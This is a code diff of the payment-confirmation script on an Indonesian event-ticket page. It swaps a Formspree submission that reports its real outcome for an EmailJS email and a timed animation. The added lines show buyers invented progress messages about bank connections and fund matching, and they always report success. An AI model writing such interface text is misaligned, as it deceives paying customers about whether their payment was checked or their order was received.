-    }).catch(viaImg);
-  }else{
-    viaImg();
-  }
-});
-
-const fileInput=$('file');
-const cekInput=$('cek');
-const cek2Input=$('cek2');
-const btn=$('btn');
-const previewEl=$('preview');
-const previewImg=$('previewImg');
-const fileNameEl=$('fileName');
-const checkButton=()=>{
-  if(!isProcessing)btn.disabled=!(uploaded&&proofReady&&!!proof.dataUrl&&cekInput.checked&&cek2Input.checked);
-};
-const revokePreview=()=>{
-  if(previewImg.src&&previewImg.src.startsWith('blob:'))URL.revokeObjectURL(previewImg.src);
-};
-const resetProof=()=>{
-  fileInput.value='';
-  revokePreview();
-  uploaded=false;
-  proofReady=false;
-  proof={name:'',dataUrl:null,attached:false};
-  previewEl.style.display='none';
-  checkButton();
-};
-
-fileInput.addEventListener('change',async function(){
-  if(isProcessing)return;
-  const file=this.files&&this.files[0];
-  if(!file)return;
+fileInput.addEventListener('change',function(){
+  if(!this.files||!this.files.length)return;
+  const file=this.files[0];
   if(!file.type||!file.type.startsWith('image/')){
-    resetProof();
-    toast('File harus berupa gambar (JPG/PNG/JPEG/WEBP).');
+    this.value='';
+    uploaded=false;
+    previewEl.style.display='none';
+    checkButton();
+    toast('File harus berupa gambar (JPG/PNG/JPEG).');
     return;
   }
-  if(file.size>PROOF_MAX_BYTES){
-    resetProof();
-    toast('Ukuran file maksimal 8 MB — silakan pilih gambar yang lebih kecil.');
-    return;
-  }
-  const seq=++proofSeq;
   uploaded=true;
-  proofReady=false;
-  proof={name:file.name,dataUrl:null,attached:false};
-  try{localStorage.setItem(RECEIPT_KEY,file.name)}catch(e){}
+  try{localStorage.setItem(RECEIPT_KEY,file.name)}catch{}
   previewEl.style.display='block';
-  revokePreview();
+  if(previewImg.src.startsWith('blob:'))URL.revokeObjectURL(previewImg.src);
   previewImg.src=URL.createObjectURL(file);
+  const fileNameEl=document.getElementById('fileName');
   fileNameEl.innerHTML='<svg aria-hidden="true"><use href="#i-image"/></svg>';
   fileNameEl.appendChild(document.createTextNode(file.name));
   checkButton();
-  try{
-    let dataUrl=await compressImage(file,PROOF_MAX_DIM,PROOF_QUALITY);
-    if(seq!==proofSeq)return;
-    if(dataUrl.length>900000)dataUrl=await compressImage(file,1000,0.55);
-    if(seq!==proofSeq)return;
-    proof.dataUrl=dataUrl;
-    proofReady=true;
-    checkButton();
-  }catch(e){
-    if(seq===proofSeq){
-      resetProof();
-      toast('Bukti pembayaran gagal diproses. Silakan pilih gambar lain.');
-    }
-  }
 });
 
 cekInput.addEventListener('change',checkButton);
-cek2Input.addEventListener('change',checkButton);
 
-const loadingOverlay=$('loading');
-const progressCircle=$('progressCircle');
-const progressNum=$('progressNum');
-const loadingBar=$('loadingBar');
-const loadingTimeEl=$('loadingTime');
-const loadingSubtitle=$('loadingSubtitle');
-const emailStatusEl=$('emailStatus');
+const loadingOverlay=document.getElementById('loading');
+const progressCircle=document.getElementById('progressCircle');
+const progressNum=document.getElementById('progressNum');
+const loadingBar=document.getElementById('loadingBar');
+const loadingTimeEl=document.getElementById('loadingTime');
+const loadingSubtitle=document.getElementById('loadingSubtitle');
 const CIRCUMFERENCE=2*Math.PI*80;
 progressCircle.style.strokeDasharray=CIRCUMFERENCE;
 progressCircle.style.strokeDashoffset=CIRCUMFERENCE;
-
 const subtitles=[
-  'Memeriksa data pesanan Anda...',
-  'Mengompres bukti pembayaran untuk dilampirkan...',
-  'Menyiapkan data konfirmasi pembayaran...',
-  'Mengirim data konfirmasi ke server Formspree...',
-  'Mencatat pesanan dengan status PENDING...',
-  'Memasukkan pesanan ke antrean verifikasi CS...',
+  'Sedang memverifikasi data pembayaran Anda...',
+  'Memeriksa keamanan transaksi...',
+  'Memvalidasi bukti transfer QRIS...',
+  'Menyiapkan dan mengirim email status pesanan...',
+  'Menghubungkan ke server bank...',
+  'Mencocokkan dana dengan merchant...',
+  'Memproses verifikasi manual oleh CS...',
+  'Menghubungkan ke Customer Service...',
   'Menyinkronkan data pesanan...',
   'Hampir selesai, mohon tunggu...'
 ];
@@ -712,12 +584,11 @@ const stepIconHTML=Array.from(stepElements,el=>el.querySelector('.step-icon').in
 const formatTime=sec=>padZero(Math.floor(sec/60))+':'+padZero(sec%60);
 const totalTimeStr=formatTime(LOADING_DURATION/1000);
 
+const emailStatusEl=document.getElementById('emailStatus');
+let emailTimer=null;
 let completionTimer=null;
-let progressTimer=null;
-let emailAttempt=0;
+let emailSent=false;
 let finished=false;
-let startTime=0;
-let submissionSucceeded=false;
 
 const markEmailStepDone=()=>{
   const el=stepElements[2];
@@ -727,107 +598,51 @@ const markEmailStepDone=()=>{
   el.querySelector('.step-icon').innerHTML=CHECK_SVG;
 };
 
-const isValidEmail=v=>typeof v==='string'&&/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v.trim());
-const formatOrderDate=()=>{
-  const now=new Date();
-  const d=now.toLocaleDateString('id-ID',{day:'numeric',month:'long',year:'numeric'});
-  const t=now.toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'}).replace(':','.');
-  return d+', '+t+' WIB';
-};
-const setEmailStatus=(msg,cls)=>{
-  emailStatusEl.textContent=msg;
-  emailStatusEl.classList.remove('sending','ok','fail');
-  if(cls)emailStatusEl.classList.add(cls);
-};
-
-const dataUrlToBlob=dataUrl=>{
-  const parts=dataUrl.split(',');
-  const mime=parts[0].match(/:(.*?);/)[1];
-  const bstr=atob(parts[1]);
-  const u8=new Uint8Array(bstr.length);
-  for(let i=0;i<bstr.length;i++)u8[i]=bstr.charCodeAt(i);
-  return new Blob([u8],{type:mime});
-};
-
-const buildFormData=includeAttachment=>{
-  const fd=new FormData();
-  fd.append('_subject','Konfirmasi Pembayaran QRIS — NEVERLAND BANDUNG 2027');
-  fd.append('nama',order.nama||'-');
-  fd.append('email',(order.email||'').trim());
-  fd.append('whatsapp',order.whatsapp||order.wa||'-');
-  fd.append('order_id',orderId);
-  fd.append('data_peserta',JSON.stringify(holders));
-  fd.append('tiket',jenisText);
-  fd.append('jumlah',String(cart.totalQty||0));
-  fd.append('total',totalStr);
-  fd.append('metode','QRIS');
-  fd.append('tanggal',formatOrderDate());
-  fd.append('bukti_nama_file',proof.name||'-');
-  fd.append('status','PENDING — Menunggu verifikasi panitia');
-  fd.append('brand',BRAND_NAME);
-  if(includeAttachment&&proof.dataUrl){
-    const blob=dataUrlToBlob(proof.dataUrl);
-    fd.append('bukti_pembayaran',blob,proof.name||'bukti.jpg');
-  }
-  return fd;
-};
-
-const scheduleRetry=(includeAttachment,delay)=>{
-  if(finished||!isProcessing)return;
-  if(Date.now()-startTime>LOADING_DURATION-12000){
-    setEmailStatus('Konfirmasi gagal terkirim — pesanan TETAP diproses. Segera hubungi CS '+CS_PHONE,'fail');
+const sendPendingEmail=()=>{
+  if(!order.email){
+    emailStatusEl.textContent='Email pemesan tidak ditemukan. Segera hubungi CS '+CS_PHONE+'.';
+    emailStatusEl.classList.add('fail');
     return;
   }
-  setTimeout(()=>{if(!finished&&isProcessing)doSend(includeAttachment)},delay);
-};
-
-const doSend=includeAttachment=>{
-  if(finished||!isProcessing)return;
-  const buyerEmail=(order.email||'').trim();
-  if(!isValidEmail(buyerEmail)){
-    setEmailStatus('Alamat e-mail pemesan tidak valid — pesanan tetap diproses. Hubungi CS '+CS_PHONE,'fail');
+  if(emailSent){
+    emailStatusEl.textContent='✓ Email status PENDING telah dikirim ke '+order.email;
+    emailStatusEl.classList.add('ok');
+    markEmailStepDone();
     return;
   }
-  setEmailStatus(
-    (includeAttachment&&proof.dataUrl?'Mengirim konfirmasi + bukti pembayaran':'Mengirim data konfirmasi pembayaran')+' ke server...',
-    'sending'
-  );
-  fetch(FORMSPREE_URL,{
-    method:'POST',
-    body:buildFormData(includeAttachment),
-    headers:{'Accept':'application/json'}
-  })
-    .then(r=>({ok:r.ok}))
-    .then(({ok})=>{
-      if(ok){
-        submissionSucceeded=true;
-        proof.attached=includeAttachment&&!!proof.dataUrl;
-        setEmailStatus('Konfirmasi pembayaran terkirim'+
-          (proof.attached?' (bukti terlampir)':' (tanpa lampiran — tunjukkan bukti ke CS bila diminta)'),'ok');
-        markEmailStepDone();
-      }else{
-        throw new Error('Submission failed');
-      }
-    })
-    .catch(()=>{
-      emailAttempt++;
-      if(includeAttachment&&proof.dataUrl){
-        setEmailStatus('Lampiran gagal terkirim — mencoba ulang tanpa lampiran...','sending');
-        scheduleRetry(false,5000);
-      }else if(emailAttempt<3){
-        setEmailStatus('Jaringan lambat — mencoba kirim ulang ('+(emailAttempt+1)+'/3)...','sending');
-        scheduleRetry(false,5000);
-      }else{
-        setEmailStatus('Konfirmasi gagal terkirim — pesanan TETAP diproses. Segera hubungi CS '+CS_PHONE,'fail');
-      }
-    });
+  emailStatusEl.textContent='Mengirim email status PENDING ke '+order.email+'...';
+  emailStatusEl.classList.add('sending');
+  if(!emailjsReady){
+    emailStatusEl.textContent='Layanan email belum siap. Segera hubungi CS '+CS_PHONE+'.';
+    emailStatusEl.classList.remove('sending');
+    emailStatusEl.classList.add('fail');
+    return;
+  }
+  emailjs.send(EMAIL_SERVICE,EMAIL_TEMPLATE_PENDING,{
+    to_email:order.email,
+    to_name:order.nama||'Pemesan Tiket',
+    order_id:orderId,
+    whatsapp:order.wa||'-',
+    jenis_tiket:jenisText,
+    jumlah_tiket:String(cart.totalQty),
+    total_bayar:totalStr
+  }).then(()=>{
+    emailSent=true;
+    emailStatusEl.textContent='✓ Email PENDING terkirim ke '+order.email+' — segera konfirmasi ke CS '+CS_PHONE;
+    emailStatusEl.classList.remove('sending');
+    emailStatusEl.classList.add('ok');
+    markEmailStepDone();
+  }).catch(()=>{
+    emailStatusEl.textContent='Email gagal terkirim. Segera hubungi CS '+CS_PHONE+'.';
+    emailStatusEl.classList.remove('sending');
+    emailStatusEl.classList.add('fail');
+  });
 };
 
 const finishLoading=()=>{
   if(finished)return;
   finished=true;
-  if(progressTimer){clearInterval(progressTimer);progressTimer=null}
-  clearTimeout(completionTimer);
+  clearTimeout(emailTimer);
   stepElements.forEach(el=>{
     el.classList.remove('active');
     el.classList.add('done');
@@ -835,30 +650,7 @@ const finishLoading=()=>{
   });
   progressNum.textContent=100;
   loadingBar.style.width='100%';
-  loadingSubtitle.textContent=submissionSucceeded
-    ? 'Data konfirmasi berhasil dikirim. Pesanan berstatus PENDING dan menunggu verifikasi panitia. CS: '+CS_PHONE
-    : 'Waktu proses selesai, tetapi pengiriman server belum terkonfirmasi. Simpan bukti pembayaran dan hubungi CS: '+CS_PHONE;
-  try{
-    const reg={
-      order_id:orderId,
-      nama:order.nama||'',
-      email:order.email||'',
-      whatsapp:order.whatsapp||order.wa||'',
-      holders:holders,
-      kategori:cart.items.map(i=>(i.jenis||i.name||'Tiket')+' ×'+(i.qty||i.jumlah||1)).join(', '),
-      total:cart.totalPrice||0,
-      namaFileBukti:localStorage.getItem(RECEIPT_KEY)||'',
-      bukti_dilampirkan:!!proof.attached,
-      konfirmasi_terkirim:!!submissionSucceeded,
-      waktu:new Date().toISOString(),
-      status:submissionSucceeded
-        ? 'Menunggu verifikasi pembayaran panitia'
-        : 'Pengiriman konfirmasi belum terkonfirmasi — perlu tindak lanjut CS'
-    };
-    sessionStorage.setItem('neverlandRegistration',JSON.stringify(reg));
-    localStorage.setItem(STATUS_KEY,submissionSucceeded?'pending_verification':'submission_attention');
-  }catch(e){}
-  try{localStorage.setItem(ORDER_FP_CONFIRMED_KEY,orderFp)}catch(e){}
+  loadingSubtitle.textContent='Pesanan berhasil dikirim — konfirmasi ke CS '+CS_PHONE;
   setTimeout(()=>{completed=true;fadeTo('success.html')},1000);
 };
 
@@ -872,17 +664,14 @@ const startPremiumLoading=()=>{
   document.body.classList.add('no-scroll');
   emailStatusEl.textContent='';
   emailStatusEl.className='email-status';
+  clearTimeout(emailTimer);
   clearTimeout(completionTimer);
-  if(progressTimer){clearInterval(progressTimer);progressTimer=null}
   finished=false;
-  emailAttempt=0;
-  submissionSucceeded=false;
-  startTime=Date.now();
-  doSend(true);
-  completionTimer=setTimeout(finishLoading,LOADING_DURATION);
+  const startTime=Date.now();
+  emailTimer=setTimeout(sendPendingEmail,EMAIL_SEND_AT);
+  completionTimer=setTimeout(finishLoading,LOADING_DURATION+1500);
   let lastPercent=-1,lastTimeStr='',lastSubIdx=-1,lastActiveStep=-1;
   const update=()=>{
-    if(!isProcessing||finished)return;
     const elapsed=Date.now()-startTime;
     const progress=Math.min(elapsed/LOADING_DURATION,1);
     const percent=Math.floor(progress*100);
@@ -915,10 +704,13 @@ const startPremiumLoading=()=>{
       });
       lastActiveStep=activeStep;
     }
-    if(progress>=1)finishLoading();
+    if(progress<1){
+      requestAnimationFrame(update);
+    }else{
+      finishLoading();
+    }
   };
-  progressTimer=setInterval(update,200);
-  update();
+  requestAnimationFrame(update);
 };
 
 btn.addEventListener('click',()=>{
@@ -928,12 +720,11 @@ btn.addEventListener('click',()=>{
 
 window.addEventListener('pageshow',e=>{
   if(!e.persisted)return;
-  if(completed||finished){location.replace('success.html');return}
+  if(completed){location.replace('success.html');return}
   navigating=false;
+  clearTimeout(emailTimer);
   clearTimeout(completionTimer);
-  if(progressTimer){clearInterval(progressTimer);progressTimer=null}
   finished=false;
-  emailAttempt=0;
   emailStatusEl.textContent='';
   emailStatusEl.className='email-status';
   if(isProcessing){
@@ -953,7 +744,7 @@ window.addEventListener('pageshow',e=>{
   }
 });
 
-$('backHome').addEventListener('click',e=>{
+document.getElementById('backHome').addEventListener('click',e=>{
   if(e.metaKey||e.ctrlKey||e.shiftKey||e.altKey||e.button!==0)return;
   e.preventDefault();
   fadeTo('index.html');
